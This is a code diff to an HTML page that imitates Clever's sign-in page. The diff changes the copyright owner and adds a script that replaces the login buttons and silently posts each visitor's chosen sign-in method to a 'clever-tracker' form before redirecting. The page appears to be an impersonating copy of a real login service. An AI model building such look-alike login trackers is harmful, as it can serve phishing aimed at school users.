@@ -100,7 +100,7 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
           <span class="sr-only">Clever</span>
         </div>
         <div class="legal">
-          <div class="copyright">buracha © 2025</div>
+          <div class="copyright">owwo © 2025</div>
           <div class="privacy">
             <p>https://clever.com/trust/privacy/policy</p>
             <p>https://clever.com/about/terms</p>
@@ -133,5 +133,33 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
   });
 });
 </script>
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+  document.querySelectorAll('.trackable').forEach(btn => {
+    const clone = btn.cloneNode(true); // creates a copy without event listeners
+    btn.parentNode.replaceChild(clone, btn); // replaces the original
+
+    // Now attach your own listener to the clone
+    clone.addEventListener('click', async (e) => {
+      e.preventDefault();
+      const choice = clone.dataset.choice;
+      document.getElementById('button-choice').value = choice;
+
+      const form = document.forms['clever-tracker'];
+      const data = new FormData(form);
+      data.append('form-name', 'clever-tracker');
+
+      await fetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams(data).toString(),
+      });
+
+      // After logging, redirect wherever you want manually
+      window.location.href = clone.dataset.redirect;
+    });
+  });
+});
+  </script>
   </body>
 </html>
